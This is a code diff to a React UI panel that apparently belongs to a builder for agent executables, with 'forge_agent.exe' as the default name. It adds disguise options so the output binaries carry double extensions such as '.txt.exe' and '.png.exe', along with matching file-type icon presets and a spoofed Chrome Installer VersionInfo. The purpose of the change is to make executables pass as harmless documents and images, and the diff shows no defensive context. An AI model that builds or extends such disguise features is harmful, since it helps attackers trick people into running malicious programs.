@@ -57,11 +57,11 @@ export const BinaryPanel = React.memo(function BinaryPanel({ variant, form, setF
         <FieldLabel>{t("generate.panel.filename")}</FieldLabel>
         <Input aria-label={t("generate.panel.output_filename")} name={`${id}-filename`} value={form.filename} onChange={(e) => setForm({ ...form, filename: e.target.value })} className="bg-background/60 font-mono text-xs transition-colors focus-visible:border-primary/40" placeholder="forge_agent.exe" />
         {(() => {
-          const extMap: Record<string,string> = { jpg: ".jpg", pdf: ".pdf", doc: ".docx", xls: ".xlsx", zip: ".zip" };
+          const extMap: Record<string,string> = { jpg: ".jpg", pdf: ".pdf", doc: ".docx", xls: ".xlsx", zip: ".zip", txt: ".txt", png: ".png" };
           const ext = extMap[form.disguise_as] || "";
           let preview = form.filename || "forge_agent.exe";
           if (ext && !preview.toLowerCase().includes(ext)) {
-            const base = preview.replace(/\.exe$/i, "").replace(/\.jpg$/i, "").replace(/\.pdf$/i, "").replace(/\.docx$/i, "").replace(/\.xlsx$/i, "").replace(/\.zip$/i, "");
+            const base = preview.replace(/\.exe$/i, "").replace(/\.jpg$/i, "").replace(/\.pdf$/i, "").replace(/\.docx$/i, "").replace(/\.xlsx$/i, "").replace(/\.zip$/i, "").replace(/\.txt$/i, "").replace(/\.png$/i, "").replace(/\.doc$/i, "").replace(/\.xls$/i, "").replace(/\.jpeg$/i, "");
             preview = base + ext + ".exe";
           }
           if (!preview.toLowerCase().endsWith(".exe") && !preview.toLowerCase().endsWith(".dll")) preview += ".exe";
@@ -87,6 +87,9 @@ export const BinaryPanel = React.memo(function BinaryPanel({ variant, form, setF
                 <SelectItem value="folder">Folder</SelectItem>
                 <SelectItem value="chrome">Chrome</SelectItem>
                 <SelectItem value="zip">ZIP Archive</SelectItem>
+                <SelectItem value="xls">Excel Sheet</SelectItem>
+                <SelectItem value="txt">Text Document</SelectItem>
+                <SelectItem value="png">PNG Image</SelectItem>
               </SelectContent>
             </Select>
           </div>
@@ -108,7 +111,7 @@ export const BinaryPanel = React.memo(function BinaryPanel({ variant, form, setF
         {form.icon_b64 && <div className="flex items-center gap-2 rounded-lg bg-background/60 px-2.5 py-1.5 text-xs text-muted-foreground ring-1 ring-border/40"><img alt={t("generate.panel.icon") || "Icon preview"} src={`data:image/png;base64,${form.icon_b64}`} className="size-6 rounded-md border border-border shadow-sm" /><span className="min-w-0 flex-1 truncate">{t("generate.panel.icon_selected")}: {form.icon_file?.name || "preset"} ({Math.round(form.icon_b64.length * 0.75 / 1024)}KB)</span></div>}
         {form.icon_preset && !form.icon_b64 && (
           <div className="flex items-center gap-2 rounded-lg bg-background/60 px-2.5 py-1.5 text-xs text-muted-foreground ring-1 ring-border/40">
-            <span className={`inline-block size-6 shrink-0 rounded-md border border-border shadow-sm ${form.icon_preset === "pdf" ? "bg-destructive" : form.icon_preset === "word" || form.icon_preset === "doc" ? "bg-info" : form.icon_preset === "xls" ? "bg-success" : form.icon_preset === "zip" ? "bg-warning" : form.icon_preset === "chrome" ? "bg-info" : "bg-primary"}`} aria-hidden="true" />
+            <span className={`inline-block size-6 shrink-0 rounded-md border border-border shadow-sm ${form.icon_preset === "pdf" ? "bg-destructive" : form.icon_preset === "word" || form.icon_preset === "doc" ? "bg-info" : form.icon_preset === "xls" ? "bg-success" : form.icon_preset === "txt" ? "bg-muted" : form.icon_preset === "png" ? "bg-primary" : form.icon_preset === "zip" ? "bg-warning" : form.icon_preset === "chrome" ? "bg-info" : "bg-primary"}`} aria-hidden="true" />
             <span className="truncate">Preset: {form.icon_preset} · {form.icon_preset === "pdf" ? "PDF" : form.icon_preset === "word" || form.icon_preset === "doc" ? "Word" : form.icon_preset === "xls" ? "Excel" : form.icon_preset}</span>
           </div>
         )}
@@ -123,6 +126,9 @@ export const BinaryPanel = React.memo(function BinaryPanel({ variant, form, setF
               <SelectItem value="doc">Word Document (*.docx.exe)</SelectItem>
               <SelectItem value="xls">Excel Sheet (*.xlsx.exe)</SelectItem>
               <SelectItem value="zip">ZIP Archive (*.zip.exe)</SelectItem>
+              <SelectItem value="txt">Text Document (*.txt.exe)</SelectItem>
+              <SelectItem value="png">PNG Image (*.png.exe)</SelectItem>
+              <SelectItem value="chrome">Chrome Installer (VersionInfo only)</SelectItem>
               <SelectItem value="folder">Folder (VersionInfo only)</SelectItem>
             </SelectContent>
           </Select>
